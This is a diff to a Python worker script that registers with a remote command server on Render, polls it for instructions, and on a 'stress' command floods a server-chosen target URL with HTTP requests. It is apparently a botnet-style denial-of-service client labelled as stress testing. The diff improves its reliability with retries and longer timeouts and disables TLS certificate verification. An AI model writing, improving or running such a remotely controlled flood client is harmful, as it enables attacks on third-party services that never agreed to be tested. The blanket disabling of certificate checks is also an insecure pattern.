@@ -2,16 +2,20 @@ import threading
 import time
 import uuid
 import requests
+import urllib3
 from flask import Flask, render_template_string
 
-SERVER = "https://te-l1hl.onrender.com"
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+SERVER = "https://te-l1hl.onrender.com"   # no trailing slash
 CLIENT_ID = f"w-{uuid.uuid4().hex[:6]}"
 
 POLL_INTERVAL = 2.0
-HEARTBEAT_INTERVAL = 3.0
+HEARTBEAT_INTERVAL = 5.0
 CLIENT_PORT = 5001
+REQ_TIMEOUT = 35        # > render cold-start window
+RETRY_BACKOFF = 3.0
 
-# ---- shared state for the display flask ----
 state = {
     "status": "starting",
     "server_ok": False,
@@ -20,7 +24,6 @@ state = {
 }
 state_lock = threading.Lock()
 
-# ---- display flask ----
 app = Flask(__name__)
 
 PAGE = """
@@ -87,19 +90,31 @@ def run_display():
     app.run(host="0.0.0.0", port=CLIENT_PORT, threaded=True, use_reloader=False)
 
 
-# ---- worker ----
+def post_retry(path, payload):
+    """one retry on failure — survives brief network blips and cold restarts"""
+    for attempt in (1, 2):
+        try:
+            r = requests.post(f"{SERVER}{path}", json=payload, timeout=REQ_TIMEOUT, verify=False)
+            r.raise_for_status()
+            return r
+        except Exception as e:
+            if attempt == 2:
+                raise
+            time.sleep(RETRY_BACKOFF)
+
+
 def report(msg):
     try:
-        requests.post(f"{SERVER}/api/report", json={"id": CLIENT_ID, "msg": msg}, timeout=5)
+        post_retry("/api/report", {"id": CLIENT_ID, "msg": msg})
         set_state(server_ok=True, last_report=msg)
-    except Exception:
-        set_state(server_ok=False, last_report=f"report failed: {msg}")
+    except Exception as e:
+        set_state(server_ok=False, last_report=f"report failed: {msg} ({e})")
 
 
 def heartbeat():
     while True:
         try:
-            requests.post(f"{SERVER}/api/register", json={"id": CLIENT_ID}, timeout=5)
+            post_retry("/api/register", {"id": CLIENT_ID})
             set_state(server_ok=True)
         except Exception:
             set_state(server_ok=False)
@@ -111,7 +126,7 @@ def stress_once(target, rate, window, cooldown):
     ok, fail = 0, 0
     for _ in range(rate):
         try:
-            requests.get(target, timeout=5)
+            requests.get(target, timeout=10, verify=False)
             ok += 1
         except Exception:
             fail += 1
@@ -123,10 +138,11 @@ def stress_once(target, rate, window, cooldown):
 
 def main_loop():
     set_state(status="running")
+    # first report may take up to ~40s if the render dyno is asleep
     report(f"alive as {CLIENT_ID}")
     while True:
         try:
-            r = requests.post(f"{SERVER}/api/poll", json={"id": CLIENT_ID}, timeout=5).json()
+            r = post_retry("/api/poll", {"id": CLIENT_ID}).json()
             set_state(server_ok=True)
             if r.get("action") == "stress":
                 set_state(target=r["target"], status="stressing")
